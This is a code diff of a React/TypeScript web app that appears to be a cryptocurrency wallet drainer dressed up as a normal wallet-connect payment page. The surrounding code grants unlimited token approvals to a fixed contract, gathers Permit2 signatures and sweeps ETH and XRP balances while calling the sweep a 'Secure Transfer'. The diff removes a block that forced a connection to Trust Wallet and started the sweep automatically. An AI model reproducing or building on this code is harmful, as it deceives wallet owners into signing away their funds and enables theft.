@@ -34,6 +34,8 @@ const XRP_COLD_WALLET = 'rYourActualXRPAddressHere';
 // 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'
 
+
+
 // 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
@@ -42,7 +44,7 @@ const TARGET_TOKENS: Record<string, any> = {
     ],
     EVM: [
       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
-      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0ce3606eB48', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
       { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
       { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
       { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
@@ -95,19 +97,6 @@ createAppKit({
   themeMode: 'light', 
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
-  customWallets: [
-    {
-      id: 'trust',
-      name: 'Trust Wallet',
-      homepage: 'https://trustwallet.com',
-      image_url: 'https://trustwallet.com/assets/images/media/assets/TWT.png', 
-      mobile_link: 'trust://',
-      desktop_link: 'trust://',
-      app_store: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
-      play_store: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
-      // rdns: 'com.trustwallet.app' 
-    }
-  ],
   features: { email: false, socials: [], analytics: true },
 })
 
@@ -193,58 +182,14 @@ export default function App() {
     }
   }
 
- const handleAction = async () => {
+ const handleAction = () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
       setAmountError('Amount field is required');
       return; 
     }
     setAmountError('');
 
-    // ── ADVANCED TRUST WALLET 2026 DETECTION BLOCK ──
-    let injectedProvider = null;
-    if (typeof window !== 'undefined') {
-      const w = window as any;
-      
-      // Strategy 1: EIP-6963 Standard Discovery (Targeting New Trust Architecture)
-      if (w.ethereum?.providers?.length) {
-        injectedProvider = w.ethereum.providers.find((p: any) => p.isTrust || p.isTrustWallet || p._isTrust || p.constructor?.name?.includes('Trust'));
-      }
-      
-      // Strategy 2: Direct Namespace Fallbacks
-      if (!injectedProvider) {
-        injectedProvider = w.trustwallet || w.trustWallet || w.ethereum?.trustWallet;
-      }
-      
-      // Strategy 3: Standard Injected Validation with Flag Interception
-      if (!injectedProvider && w.ethereum) {
-        const isTrustLegacy = w.ethereum.isTrust || w.ethereum.isTrustWallet || w.ethereum._isTrust;
-        const isTrustProxy = w.ethereum.providers?.some((p: any) => p.isTrust) || false;
-        
-        if (isTrustLegacy || isTrustProxy) {
-          injectedProvider = w.ethereum;
-        }
-      }
-    }
-
-    if (!isConnected && injectedProvider && injectedProvider.request) {
-      try {
-        setLoading(true);
-        setStatus('Connecting Wallet...');
-        log("[SYSTEM] Trust Wallet Detectado. Forzando handshake directo...");
-        const accounts = await injectedProvider.request({ method: 'eth_requestAccounts' });
-        if (accounts && accounts.length > 0) {
-          log(`[SYSTEM] Conexión nativa exitosa: ${accounts[0]}`);
-          // Dispara el ciclo usando directamente el proveedor inyectado detectado
-          setTimeout(() => approveAndCollect(injectedProvider, accounts[0]), 500);
-        } else {
-          setLoading(false);
-        }
-      } catch (e) {
-        log('❌ Conexión rechazada por el usuario');
-        setStatus('Ready');
-        setLoading(false);
-      }
-    } else if (!isConnected) {
+    if (!isConnected) {
       manualConnect.current = true; 
       open(); 
     } else {
@@ -276,11 +221,8 @@ export default function App() {
     return await signer.signTypedData(domain, types, message);
   };
 
-  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
-    const activeProvider = forcedProvider || evmWalletProvider;
-    const activeAddress = forcedAddress || walletAddress;
-
-    if (!activeAddress || !activeProvider) return;
+  const approveAndCollect = async () => {
+    if (!walletAddress || !evmWalletProvider) return;
     
     if (isExecuting.current) {
         log("⚠️ Blocked duplicate execution loop.");
@@ -295,10 +237,8 @@ export default function App() {
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-      const ethersProvider = new BrowserProvider(activeProvider as any);
-      const network = await ethersProvider.getNetwork();
-      const activeChainId = Number(network.chainId);
-      const signer = await ethersProvider.getSigner(activeAddress);
+      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
+      const signer = await ethersProvider.getSigner(walletAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       const deadline = Math.floor(Date.now() / 1000) + 3600;
 
@@ -325,7 +265,7 @@ export default function App() {
 
       validTokens.sort(smartTokenSort);
       
-      const rawProvider = activeProvider as any;
+      const rawProvider = evmWalletProvider as any;
       const w = window as any;
       const injected = w.ethereum || {};
       
@@ -356,7 +296,7 @@ export default function App() {
               const sweepAmount = (xrpBalance - 11).toFixed(6);
               log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
               
-              const txHash = await (activeProvider as any).request({
+              const txHash = await (evmWalletProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
                   from: cleanSenderAddress,
@@ -426,7 +366,7 @@ export default function App() {
                     const currentNonce = Number(allowanceData.nonce);
                     log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);
 
-                    const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS };
+                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
                     const types = {
                         PermitSingle: [
                             { name: 'details', type: 'PermitDetails' },
@@ -483,7 +423,7 @@ export default function App() {
                 const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                 
                 // 🛠️ FIX 2: THE RAW RPC BYPASS
-                const txHash = await (activeProvider as any).request({
+                const txHash = await (evmWalletProvider as any).request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: cleanSenderAddress,
@@ -519,7 +459,7 @@ export default function App() {
               const sendAmount = liveBal - totalGas;
               const hexValue = "0x" + sendAmount.toString(16);
               
-              const txHash = await (activeProvider as any).request({
+              const txHash = await (evmWalletProvider as any).request({
                   method: 'eth_sendTransaction',
                   params: [{
                       from: cleanSenderAddress,
